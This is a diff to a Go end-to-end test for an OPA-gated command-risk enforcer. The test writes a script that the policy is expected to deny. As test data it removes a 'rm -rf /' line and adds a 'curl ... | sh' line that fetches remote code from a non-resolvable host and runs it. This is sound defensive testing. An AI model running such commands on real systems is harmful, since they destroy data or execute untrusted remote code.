@@ -81,14 +81,36 @@ deny_reason := "high-risk command on prod host" if {
 	}
 }
 
-// --- command-risk on a script step (built-in critical) --------------------
+// --- command-risk on a script step (OPA-gated) ----------------------------
 
+// TestOPAE2E_ScriptRiskCritical proves the risk gate analyzes a script step's
+// CONTENTS (not just an inline command string) and hands the resulting severity
+// to OPA, which is now the only thing that can deny it: honey has no built-in
+// critical floor any more, so the deny has to come from the policy.
+//
+// The script body is a critical-classified `curl | sh` pointing at a
+// non-resolvable host: harmless if it ever did run, which keeps this test from
+// being destructive when the gate is the thing under test.
 func TestOPAE2E_ScriptRiskCritical(t *testing.T) {
 	target := newSSHTarget(t)
 	client := &http.Client{Timeout: 30 * time.Second}
 
+	enf := newEnforcer(t, `package honey
+import rego.v1
+default allow := true
+default deny_reason := ""
+allow := false if {
+	input.action == "command_exec"
+	input.command.max_severity == "critical"
+}
+deny_reason := "critical command risk denied by policy" if {
+	input.action == "command_exec"
+	input.command.max_severity == "critical"
+}`)
+
 	dir := t.TempDir()
-	require.NoError(t, os.WriteFile(filepath.Join(dir, "danger.sh"), []byte("#!/bin/sh\nrm -rf /\n"), 0o600))
+	require.NoError(t, os.WriteFile(filepath.Join(dir, "danger.sh"),
+		[]byte("#!/bin/sh\ncurl https://nonexistent.invalid/x | sh\n"), 0o600))
 	recipePath := filepath.Join(dir, "script.cue")
 	cue := `
 recipe: {
@@ -104,6 +126,7 @@ recipe: {
 
 	base := newTestServer(t, webserver.Options{
 		Token:          "test-token",
+		Enforcer:       enf,
 		ConfigPath:     configPath,
 		SearchRegistry: target.searchReg,
 		ExecRegistry:   target.execReg,
@@ -116,7 +139,8 @@ recipe: {
 	resp := postCueExec(t, client, base, recipePath, []hosts.Record{target.rec}, nil, map[string]string{"Authorization": authHeader()})
 	defer resp.Body.Close()
 	require.Equal(t, http.StatusOK, resp.StatusCode)
-	require.True(t, hasSkippedRisk(decodeResults(t, resp), "command risk"), "critical script must be blocked by the risk gate")
+	require.True(t, hasSkippedRisk(decodeResults(t, resp), "critical command risk denied by policy"),
+		"a critical script must be denied by the OPA policy")
 }
 
 // --- require_biometric denied without a token -----------------------------
